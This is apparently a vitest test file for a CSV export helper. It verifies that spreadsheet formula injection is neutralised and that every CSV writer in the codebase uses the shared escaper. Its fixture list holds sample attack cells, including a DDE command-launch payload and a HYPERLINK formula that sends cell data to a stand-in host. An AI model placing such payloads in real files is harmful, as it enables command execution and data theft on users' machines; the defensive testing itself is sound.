import { describe, it, expect } from 'vitest';
import { csvCell, csvRow } from '../src/lib/csv';

// ═══════════════════════════════════════════════════════════════════════════
// A CSV this product writes is opened in Excel or Google Sheets, and both
// EXECUTE a cell that begins with = + - @ TAB or CR. The audit trail and the
// support report both export DB-sourced text — an action description, a
// customer's own name — so a cell is attacker-influenceable and must not be
// able to become a formula. CWE-1236.
// ═══════════════════════════════════════════════════════════════════════════

describe('csvCell — formula injection', () => {
  const ATTACKS = [
    '=1+1',
    '=cmd|\' /C calc\'!A0',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\tSUM(A1)',
    '\r=1+1',
    '=HYPERLINK("http://evil.test?x="&A1,"click")',
  ];
  for (const a of ATTACKS) {
    it(`neutralises ${JSON.stringify(a)}`, () => {
      const out = csvCell(a);
      // The payload survives as DATA — nothing is silently dropped — but the
      // cell no longer STARTS with a trigger character once the quote that
      // wraps it is removed.
      const inner = out.slice(1, -1);
      expect(/^[=+\-@\t\r]/.test(inner)).toBe(false);
      expect(out.startsWith('"')).toBe(true);
      expect(out.endsWith('"')).toBe(true);
    });
  }

  it('leaves a negative NUMBER alone — a financial export must not turn -1500 into text', () => {
    expect(csvCell('-1500')).toBe('"-1500"');
    expect(csvCell('-15.75')).toBe('"-15.75"');
    expect(csvCell(-1500)).toBe('"-1500"');
  });

  it("still guards a '-' that is not a number", () => {
    expect(csvCell('-1+1')).toBe('"\'-1+1"');
    expect(csvCell('--sneaky')).toBe('"\'--sneaky"');
  });

  it('doubles embedded quotes and keeps commas and newlines inside the cell', () => {
    expect(csvCell('Dana "D" W')).toBe('"Dana ""D"" W"');
    expect(csvCell('a,b\nc')).toBe('"a,b\nc"');
  });

  it('renders null and undefined as an empty cell, never the word', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it('csvRow joins cells with a comma and quotes every one of them', () => {
    expect(csvRow(['a', '=1+1', 2])).toBe('"a","\'=1+1","2"');
  });
});

// ── The pin, inverted ──────────────────────────────────────────────────────
// If csvCell ever stops guarding, THIS is the test that goes red. Emptying the
// ATTACKS list above turns eight assertions into zero and the file still
// passes — which is why the count is asserted too.
describe('the guard cannot quietly become a no-op', () => {
  it('every trigger character Excel and Sheets act on is covered', () => {
    const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];
    expect(TRIGGERS.length).toBe(6);
    for (const t of TRIGGERS) {
      expect(csvCell(`${t}payload`)).toBe(`"'${t}payload"`);
    }
  });
});

// ── The estate-wide pin ────────────────────────────────────────────────────
// Two exports were fixed by hand. This is what stops a third being written the
// old way: any file that builds a text/csv Blob must get its cells from
// src/lib/csv.ts. The scan is over real files, so a NEW export in a NEW file
// fails here without anyone remembering this concern exists.
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';

function walk(dir: string, out: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) walk(p, out);
    else if (/\.tsx?$/.test(name)) out.push(p);
  }
  return out;
}

describe('every CSV writer in src/ uses the shared cell escaper', () => {
  const files = walk('src');
  const writers = files.filter(f => {
    const s = readFileSync(f, 'utf8');
    return /type:\s*'text\/csv'/.test(s) || /type:\s*"text\/csv"/.test(s);
  });

  it('finds the CSV writers at all — a scan matching nothing proves nothing', () => {
    expect(files.length).toBeGreaterThan(200);
    expect(writers.length).toBeGreaterThanOrEqual(2);
  });

  for (const f of writers) {
    it(`${f} builds its cells with csvCell/csvRow`, () => {
      const s = readFileSync(f, 'utf8');
      // Either it imports the helper, or it hands its rows to something that
      // does (SupportHistoryReport delegates to reportToCsv).
      const usesHelper = /from '[^']*\/csv'/.test(s) || /\bcsv(Cell|Row)\b/.test(s);
      const delegates = /\breportToCsv\b/.test(s);
      expect(usesHelper || delegates).toBe(true);
    });
  }
});
